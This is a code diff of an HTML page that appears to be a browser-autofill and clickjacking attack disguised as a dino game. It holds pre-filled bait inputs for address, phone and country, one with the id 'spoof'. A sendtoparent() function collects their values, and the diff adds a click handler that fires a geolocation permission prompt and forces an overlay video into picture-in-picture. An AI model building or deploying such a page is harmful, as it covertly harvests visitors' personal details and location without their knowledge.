@@ -93,7 +93,6 @@
       height: 50px;
     }
 
-    /* Scrollbar */
     ::-webkit-scrollbar { width: 8px; }
     ::-webkit-scrollbar-track { background: #f1f1f1; }
     ::-webkit-scrollbar-thumb { background: #888; }
@@ -119,7 +118,6 @@
 
   <video id="video" controls muted loop autoplay src="inst-overlay.mp4" autopictureinpicture hidden></video>
 
-  <!-- Autofill fields -->
   <input name="address-line1" id="address-line1" autocomplete="address-line1" onchange="sendtoparent();" placeholder="Address Line 1">
   <input name="address-line2" id="address-line2" autocomplete="address-line2" onchange="sendtoparent();" placeholder="Address Line 2">
   <input name="spoof" id="spoof" autocomplete="country-name" placeholder="Country">
@@ -130,25 +128,25 @@
   <input name="postal-code" autocomplete="postal-code" placeholder="Postal Code">
   <input name="tel" autocomplete="tel" id="tel" placeholder="Phone">
 
-  <!-- JavaScript Logic -->
   <script>
     const htmlid = document.getElementById('htmlid');
     const video = document.getElementById('video');
 
-    htmlid.addEventListener('keyup', () => {
-      setTimeout(() => {
-        video.requestPictureInPicture();
-      }, 60);
-
-      setTimeout(() => {
-        video.requestPictureInPicture();
-      }, 40);
-    });
-
     htmlid.addEventListener('click', () => {
-      setTimeout(() => {
-        // video.requestPictureInPicture();
-      }, 150);
+      // 🔘 Trigger geolocation permission prompt
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          console.log("Location allowed:", pos.coords.latitude, pos.coords.longitude);
+        },
+        (err) => {
+          console.warn("Location error:", err);
+        }
+      );
+
+      // ▶️ Trigger Picture-in-Picture for video
+      if (video) {
+        video.requestPictureInPicture().catch(console.warn);
+      }
     });
 
     function sendtoparent() {
@@ -160,7 +158,6 @@
         ",Phone: " + document.getElementById("tel").value;
     }
 
-    // Dino game logic
     const character = document.getElementById("character");
     const block = document.getElementById("block");
     let counter = 0;
@@ -186,6 +183,5 @@
 
     setTimeout(() => video.setAttribute('src', './inst-overlay.mp4'), 100);
   </script>
-
 </body>
 </html>
